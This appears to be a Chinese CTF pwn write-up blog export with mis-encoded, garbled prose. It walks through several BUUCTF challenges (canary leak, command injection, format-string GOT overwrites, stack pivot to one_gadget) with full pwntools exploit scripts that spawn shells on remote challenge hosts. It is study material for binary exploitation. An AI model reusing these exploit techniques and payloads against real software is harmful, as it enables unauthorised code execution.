<p>â€‹	ä¸‹é¢å›¾ä¸­ï¼Œ<code>printf</code>å¯ä»¥æ‰“å°å‡º<code>buf</code>çš„åœ°å€é‡Œçš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æ¥è®²æ˜¯ä¸ä¼šè¾“å‡º<code>canary</code>çš„ï¼Œå› ä¸º<code>canary</code>çš„æœ€å<code>1</code>ä¸ªå­—èŠ‚æ˜¯<code>\x00</code>æ ‡å¿—ç€å­—ç¬¦ä¸²çš„ç»“æŸï¼Œä½†æ˜¯å¦‚æœå¯ä»¥è¦†ç›–<code>\x00</code>ï¼Œ<code>canary</code>ä¾¿ä¼šè¢«è¿å¸¦ç€æ‰“å°å‡ºæ¥ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100759.png" alt="image-20240710110038682"></p>
<p><code>read</code>å¯ä»¥è¯»å…¥<code>64</code>ä¸ªå­—èŠ‚ï¼Œè¦†ç›–<code>canary</code>æœ€å<code>1</code>ä¸ªå­—èŠ‚<code>\x00</code>åªéœ€è¦<code>41</code>ä¸ªå­—èŠ‚å³å¯</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053220.png" alt="å±å¹•æˆªå›¾ 2024-03-09 170006"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Input your Name:\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>è¦†ç›–åï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100880.png" alt="image-20240710110019800"></p>
<p>æ­¤æ—¶ï¼Œ<code>canary</code>ä¾¿å¯è¢«è¾“å‡ºï¼Œæ¥æ”¶<code>canary</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#è¿™é‡Œä¸ç”¨ljustè€Œæ˜¯ç”¨rjustï¼Œljustä¼šæŠŠ\x00è¡¥åˆ°é«˜å­—èŠ‚ï¼Œè€Œrjustä¼šæŠŠ\x00è¡¥åˆ°ä½å­—èŠ‚</span></span><br></pre></td></tr></table></figure>

<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,elf,libc = load(<span class="string">&quot;babypie&quot;</span>,<span class="string">&quot;node5.buuoj.cn:26795&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Input your Name:\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x3f&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053917.png" alt="image-20240309212604335"></p>
<h1 id="äº¤æ¢å˜é‡å€¼-pwnable-loveletter"><a href="#äº¤æ¢å˜é‡å€¼-pwnable-loveletter" class="headerlink" title="(äº¤æ¢å˜é‡å€¼)pwnable_loveletter"></a><code>(äº¤æ¢å˜é‡å€¼)pwnable_loveletter</code></h1><h2 id="ä¿æŠ¤-æºç -2"><a href="#ä¿æŠ¤-æºç -2" class="headerlink" title="ä¿æŠ¤&amp;æºç "></a>ä¿æŠ¤&amp;æºç </h2><p>ä¿æŠ¤ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059447.png" alt="image-20240710105958363" style="zoom:80%;" />

<p>æºç ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053109.png" alt="image-20240318121511252" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053124.png" alt="image-20240318121436189" style="zoom:50%;" />

<h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>â€‹	æœ€å¼€å§‹ä»¥ä¸ºç¨‹åºä¸­æ²¡æœ‰æ ˆæº¢å‡ºï¼Œæ€è·¯æ˜¯ç”¨é€»è¾‘è¿ç®—ç¬¦åˆ†éš”å­—ç¬¦ä¸²æ‰§è¡Œ<code>/bin/sh</code>æˆ–è€…å…¶ä»–å‘½ä»¤ï¼Œä½†æ˜¯çœ‹åˆ°ä¼šè¢«<code>protect</code>å‡½æ•°è¿‡æ»¤ã€‚</p>
<p>â€‹	ç„¶åä¹Ÿæ˜¯åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å‘ç°æ›¿æ¢åçš„å†…å®¹æ¯”æ›¿æ¢å‰å¤šäº†<code>3</code>ä¸ªå­—èŠ‚ï¼Œå¯ä»¥é€ æˆæ ˆæº¢å‡ºã€‚æ§åˆ¶<code>v6</code>è¿™ä¸ªå€¼ä¸º<code>1</code>ï¼Œå°±ä¼šæŠŠ<code>prolog=&quot;echo I love &quot;</code>ä¸­çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ‹¼æ¥åˆ°<code>loveletter</code>ä¸­ã€‚ç„¶åæˆ‘ä»¬ç›´æ¥å†™è¿›<code>nv sh -c sh </code>æ‹¼æ¥å³å¯ï¼Œæ³¨æ„è¿™é‡Œè¦åœ¨æœ€åç•™ä¸€ä¸ªç©ºæ ¼ï¼Œå› ä¸ºåé¢è¿˜ä¼šåœ¨è¢«æ‹¼æ¥æ•°æ®ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;nv sh -c sh&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">11</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./love&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28357</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;nv sh -c sh &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">12</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059332.png" alt="image-20240710105939258"></p>
<h1 id="picoctf-2018-echo-back-æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#picoctf-2018-echo-back-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="picoctf_2018_echo back(æ ¼å¼åŒ–å­—ç¬¦ä¸²)"></a><code>picoctf_2018_echo back(æ ¼å¼åŒ–å­—ç¬¦ä¸²)</code></h1><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>â€‹	ç¨‹åºä¸­æœ‰<code>system</code>å‡½æ•°ï¼Œæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œ<code>RELRO</code>ä¿æŠ¤ä¸º<code>Partial RELRO</code>ï¼Œå¯ä»¥åŠ«æŒ<code>printf</code>çš„<code>got</code>è¡¨ä¸º<code>system@plt</code>ã€‚ä½†æ˜¯åªæœ‰ä¸€æ¬¡<code>printf</code>ï¼Œç„¶åæ€è·¯å°±å¡åœ¨è¿™é‡Œäº†ã€‚åæ¥åˆæƒ³åˆ°<code>printf</code>åé¢è¿˜æœ‰ä¸¤ä¸ª<code>puts</code>ï¼Œå¯ä»¥ä¿®æ”¹<code>puts</code>çš„<code>got</code>è¡¨ä¸º<code>vuln</code>çš„åœ°å€ï¼Œç„¶ååŠ«æŒç¨‹åºæ‰§è¡Œæµåˆ°<code>vuln</code>å‡½æ•°ä½¿ç¨‹åºå†æ‰§è¡Œä¸€éï¼Œä¾¿å¯è°ƒç”¨<code>syatem</code>å‡½æ•°ã€‚</p>
<h2 id="ä¿æŠ¤-æºç -3"><a href="#ä¿æŠ¤-æºç -3" class="headerlink" title="ä¿æŠ¤&amp;æºç "></a>ä¿æŠ¤&amp;æºç </h2><p>ä¿æŠ¤ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053000.png" alt="image-20240323103152232" style="zoom:67%;" />

<p>æºç ï¼š</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053566.png" alt="image-20240323103303531" style="zoom:67%;" />

<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./b&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27568</span>)</span><br><span class="line">debug(p,<span class="number">0x8048604</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_value = sys_addr&amp;<span class="number">0xffff</span></span><br><span class="line">log_addr(<span class="string">&quot;sys_value&quot;</span>)</span><br><span class="line">vuln_value = <span class="number">0x85ab</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%17$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8460</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x85ab</span>-<span class="number">0x8460</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%18$hn&#x27;</span></span><br><span class="line">payload += p32(printf_got)+p32(printf_got+<span class="number">2</span>)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">log_addr(<span class="string">&quot;printf_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;puts_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;sys_addr&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;printf_plt&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059468.png" alt="image-20240710105915397"></p>
<h1 id="GKCTF-2021-checkin"><a href="#GKCTF-2021-checkin" class="headerlink" title="[GKCTF 2021]checkin"></a><code>[GKCTF 2021]checkin</code></h1><h2 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058647.png" alt="image-20240710105852575" style="zoom:80%;" />

<h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053477.png" alt="image-20240328171631887"></p>
<p>â€‹	ç¨‹åºä¸­æœ‰ä¸¤æ¬¡<code>read</code>ï¼Œç¬¬ä¸€æ¬¡æ˜¯å°†æ•°æ®å†™åˆ°äº†<code>.bss</code>æ®µï¼Œç¬¬äºŒæ¬¡æœ‰æ ˆæº¢å‡ºæ¼æ´ï¼Œå¯ä»¥æº¢å‡º<code>8</code>ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ—¶é—´æƒ³åˆ°æ ˆè¿ç§»ã€‚ç„¶åæ˜¯ä¸€ä¸ª<code>if</code>è¯­å¥ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶åˆ™æ‰§è¡Œ<code>exit(0)</code>ç›´æ¥é€€å‡ºç¨‹åºï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠæ³•è·³è¿‡<code>if</code>è¯­å¥ä½¿ç¨‹åºä¸æ‰§è¡Œ<code>exit(0)</code>ã€‚</p>
<h2 id="æ€è·¯-3"><a href="#æ€è·¯-3" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>â€‹	é¦–å…ˆæˆ‘ä»¬è¦æƒ³åŠæ³•ç»•è¿‡<code>if</code>è¯­å¥ï¼Œç¬¬ä¸€ä¸ªå¾ˆå®¹æ˜“çœ‹å‡ºï¼Œæˆ‘ä»¬å†™è¿›<code>s1</code>çš„æ•°æ®å‰<code>5</code>ä¸ªå­—ç¬¦å¿…é¡»ä¸º<code>admin</code>ã€‚ä½†æ˜¯æˆ‘ä»¬ç‚¹è¿›ç¬¬äºŒä¸ªå‡½æ•°ä¸­ï¼Œå…¶å®æˆ‘æ˜¯çœ‹ä¸æ‡‚è¿™äº›å‡½æ•°çš„ï¼Œç„¶åçœ‹åˆ«çš„å¸ˆå‚…çš„<code>wp</code>å‘ç°æ˜¯ä¸€ä¸ª<code>md5</code>åŠ å¯†ï¼Œä¹Ÿæ˜¯è¦æˆ‘ä»¬å†™åˆ°<code>buf</code>ä¸­çš„å†…å®¹çš„å‰<code>5</code>ä¸ªå­—ç¬¦ä¸º<code>admin</code>ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png" alt="image-20240328173330991" style="zoom: 80%;" />

<p>â€‹	ç„¶åæˆ‘ä»¬å¼€å§‹å¾€<code>.bss</code>æ®µä¸­å†™<code>rop</code>é“¾ï¼Œæˆ‘ä»¬è®©ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒå­˜å‚¨<code>admin</code>ï¼Œä»¥ç»•è¿‡<code>if</code>è¯­å¥ã€‚ç„¶åè¿™é‡Œåˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬<code>read</code>åªèƒ½è¯»å…¥<code>0x20(32)</code>ä¸ªå­—èŠ‚ï¼Œè€Œ<code>b&#39;admin\x00\x00\x00&#39;+p64(pop_rdi)+p64(puts_got)</code>å·²ç»ç”¨äº†<code>24</code>ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å†™å…¥<code>elf.plt[&#39;puts&#39;]</code>åä¾¿ä¸èƒ½å†å†™è¿”å›åœ°å€äº†ï¼Œæ˜¾ç„¶è¿™æ˜¯ä¸è¡Œçš„ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç›´æ¥åŠ«æŒç¨‹åºæ‰§è¡Œæµåˆ°<code>call puts</code>æŒ‡ä»¤çš„åœ°å€ï¼Œè¿™æ ·ä¹Ÿè¾¾åˆ°äº†æˆ‘ä»¬å†æ¬¡è¿›è¡Œä¸¤æ¬¡<code>read</code>çš„ç›®çš„ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101058257.png" alt="image-20240710105823187"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">call_puts_addr = <span class="number">0x4018b5</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401ab3</span></span><br><span class="line">bss_addr = <span class="number">0x602400</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi)+p64(puts_got)+p64(call_puts_addr)</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ ˆè¿ç§»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr)</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ¬¡å¸ƒç½®<code>one_gadget</code>åˆ°<code>.bss</code>æ®µï¼Œå¹¶è¿›è¡Œæ ˆè¿ç§»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr+<span class="number">0x18</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,elf,libc = load(<span class="string">&quot;login&quot;</span>,<span class="string">&quot;node5.buuoj.cn:29508&quot;</span>,<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./login&#x27;)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,28732)</span></span><br><span class="line">debug(p,<span class="number">0x4018b5</span>)</span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./login&#x27;)</span></span><br><span class="line"><span class="comment"># # libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">call_puts_addr = <span class="number">0x4018b5</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401ab3</span></span><br><span class="line">bss_addr = <span class="number">0x602400</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi)+p64(puts_got)+p64(call_puts_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;BaileGeBai&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;puts_addr&quot;</span>)</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">one_gadget = <span class="number">0x4527a</span>+libc_base <span class="comment">#0xebcf1</span></span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = <span class="string">b&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(bss_addr+<span class="number">0x18</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101057676.png" alt="image-20240710105754596" style="zoom:67%;" />

<p>â€‹	æœ€åè¯´ä¸€ä¸‹ï¼Œä¸€å¼€å§‹æ‰“æœ¬åœ°ä¸€ç›´ä¸é€šå¹¶åœ¨ç¬¬äºŒæ¬¡è¯»å…¥å‰ç¨‹åºå°±å´©äº†ï¼Œè€Œæ‰“è¿œç¨‹å´é€šäº†ã€‚å…¶å®æ˜¯<code>libc</code>çš„åŸå› ï¼Œè¿œç¨‹çš„<code>libc</code>ä¸æœ¬åœ°çš„<code>libc</code>ä¸åŒï¼Œä¸€äº›æ ˆå¸§å¤§å°ä¹Ÿä¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæœ¬åœ°çš„<code>libc</code>æ¢æˆè¿œç¨‹çš„å³å¯ã€‚</p>
<h1 id="bbctf-2020-fmt-me"><a href="#bbctf-2020-fmt-me" class="headerlink" title="bbctf_2020_fmt_me"></a><code>bbctf_2020_fmt_me</code></h1><h2 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol>
<li><p>åœ¨<code>gdb</code>ä¸­åˆå­¦åˆ°ä¸€ä¸ªæŸ¥çœ‹åœ°å€ä¸­å†…å®¹çš„å‘½ä»¤ï¼Œ<code>x/s</code>ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¡¨ç¤ºã€‚</p>
</li>
<li><p>å¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹<code>8</code>ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯åªå†™å…¥<code>3</code>ä¸ªæˆ–æ›´å°‘çš„å­—èŠ‚ï¼Œå¯ä»¥ç›´æ¥ç”¨<code>fmtstr_payload</code>å‡½æ•°ï¼Œ<code>fmtstr_payload</code>ä¸­çš„å‚æ•°</p>
</li>
<li><p>å‘½ä»¤åˆ†éš”ç¬¦<code>;</code></p>
</li>
</ol>
<h2 id="ä¿æŠ¤-1"><a href="#ä¿æŠ¤-1" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053413.png" alt="image-20240405174940311"></p>
<h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053521.png" alt="image-20240405175211563" style="zoom:67%;" />

<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27604)</span></span><br><span class="line">debug(p,<span class="number">0x4012d5</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;atoi_got&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;system_plt&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;system&#x27;</span>]:elf.sym[<span class="string">&#x27;main&#x27;</span>]&#125;,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh;&#x27;</span></span><br><span class="line">payload+= fmtstr_payload(<span class="number">7</span>,&#123;elf.got[<span class="string">&#x27;snprintf&#x27;</span>]:<span class="number">0x401056</span>&#125;,<span class="number">8</span>,write_size=<span class="string">&#x27;long&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>BUUåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</tag>
        <tag>æ ˆè¿ç§»</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn_2019_sw_1</title>
    <url>/2024/03/01/BUU%E5%88%B7%E9%A2%98/ciscn_2019_sw_1/</url>
    <content><![CDATA[<h1 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><em>ciscn_2019_sw_1</em></h1><h2 id="å­¦ä¹ ä¸æ”¶è·"><a href="#å­¦ä¹ ä¸æ”¶è·" class="headerlink" title="å­¦ä¹ ä¸æ”¶è·"></a>å­¦ä¹ ä¸æ”¶è·</h2><ol>
<li><p>å¯¹äº<code>RELRO</code>ä¿æŠ¤ï¼Œæœ‰ä»¥ä¸‹<code>3</code>ç§æƒ…å†µï¼š</p>
<span id="more"></span>

<p><code>No RELRO</code>ï¼š<code>init.array</code>ï¼Œ<code>fini.array</code>ï¼Œ<code>got.plt</code>å‡å¯è¯»å¯å†™</p>
<p><code>PARTIAL RELRO</code>ï¼š<code>init.array</code>ï¼Œ<code>fini.array</code>å¯è¯»ä¸å¯å†™ï¼Œ<code>got.plt</code>å¯è¯»å¯å†™</p>
<p><code>FULL RELRO</code>ï¼š<code>init.array</code>ï¼Œ<code>fini.array</code>ï¼Œ<code>got.plt</code>å‡å¯è¯»ä¸å¯å†™</p>
</li>
<li><p>ç¨‹åºåœ¨åŠ è½½çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨<code>init_arry</code>ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œç¨‹åºåœ¨ç»“æŸçš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨<code>fini_array</code>ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè€Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆä¸º<code>main</code>å‡½æ•°åœ°å€ï¼Œä½¿<code>main</code>å‡½æ•°å†æ‰§è¡Œä¸€æ¬¡ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º<code>1</code>ï¼Œä¹Ÿå°±æ˜¯è¯´åªèƒ½å†™ä¸€ä¸ªåœ°å€ã€‚</p>
</li>
<li><p>æœ‰æ—¶å€™æ€è·¯å¯¹äº†ä¸€ç›´æ‰“ä¸é€šï¼Œå¯èƒ½æ˜¯å‚æ•°åç§»é‡ç®—é”™äº†ã€‚</p>
</li>
</ol>
<h2 id="ä¿æŠ¤-æºç "><a href="#ä¿æŠ¤-æºç " class="headerlink" title="ä¿æŠ¤&amp;æºç "></a>ä¿æŠ¤&amp;æºç </h2><p>ä¿æŠ¤ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102308582.png" alt="image-20240305180931509"></p>
<p>æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line"> 